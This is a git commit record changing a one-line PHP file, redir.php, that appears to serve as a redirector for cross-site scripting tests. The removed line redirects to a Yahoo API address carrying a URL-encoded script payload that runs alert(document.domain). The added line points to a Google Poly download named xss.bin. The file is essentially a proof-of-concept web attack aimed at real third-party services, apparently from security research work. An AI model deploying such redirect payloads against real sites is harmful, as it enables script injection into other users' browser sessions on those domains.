169a1121ba5a800b1a6a631a2d596ce4c56bf413
missoum1307 <missoum1307@users.noreply.github.com>
2018-01-02 22:40:18 +0100

    Update redir.php

--- redir.php
+++ redir.php
@@ -1,3 +1,3 @@
 <?php
-header('location: http://api.view.yahoo.com/api/series/xxxxxa%3C%3fPXML%3E%3Chtml:script%3Ealert(document.domain)%3C%2fhtml:script%3E');
+header('location: https://poly.google.com/downloads/eGXuYT8DqPr/378IoBkknJY/xss.bin');
 ?>
